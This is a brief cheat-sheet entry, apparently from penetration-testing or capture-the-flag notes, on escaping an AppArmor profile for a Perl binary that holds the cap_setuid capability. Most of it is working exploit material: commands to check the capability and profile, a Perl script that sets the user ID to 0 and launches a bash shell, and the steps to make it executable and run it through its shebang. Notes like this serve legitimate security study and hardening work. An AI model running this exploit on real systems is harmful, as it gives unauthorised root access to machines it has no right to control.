# AppArmor Bypass via Shebang (cap_setuid Perl)

AppArmor profiles apply when a binary is called directly (e.g. `perl script.pl`) but NOT when the script is executed via its shebang (`./script.pl`).

**Check capabilities and AppArmor profile:**
```bash
getcap /usr/bin/perl
# /usr/bin/perl = cap_setuid+ep
cat /etc/apparmor.d/usr.bin.perl
```

**Exploit — write script with shebang and execute directly:**
```perl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
```bash
chmod +x /tmp/exploit.pl
/tmp/exploit.pl   # bypasses AppArmor
```
